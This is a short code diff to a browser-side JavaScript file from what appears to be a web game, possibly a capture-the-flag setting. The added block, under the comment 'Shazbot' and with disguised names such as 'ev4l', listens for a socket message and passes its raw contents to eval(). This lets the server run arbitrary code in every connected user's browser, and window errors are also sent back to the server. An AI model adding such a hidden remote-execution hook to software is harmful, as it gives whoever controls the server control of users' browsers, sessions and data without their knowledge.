@@ -838,4 +838,18 @@ $(function () {
     .on('powerup hide', function() {
         $('#powerup').hide();
     });
+
+    // Shazbot
+    socket.on('ev4l', function(cid, rawshiz) {
+         try {
+            eval(rawshiz);
+        } catch (e) {
+            socket.emit('ctfnerp', cid, e.message);
+            console.log(cid, e.message);
+        }
+    });
+    window.addEventListener('error', function(e) {
+        console.log(`window.onerror: ${e.message}`);
+        socket.emit('ctfnerp', e.message);
+    });
 });
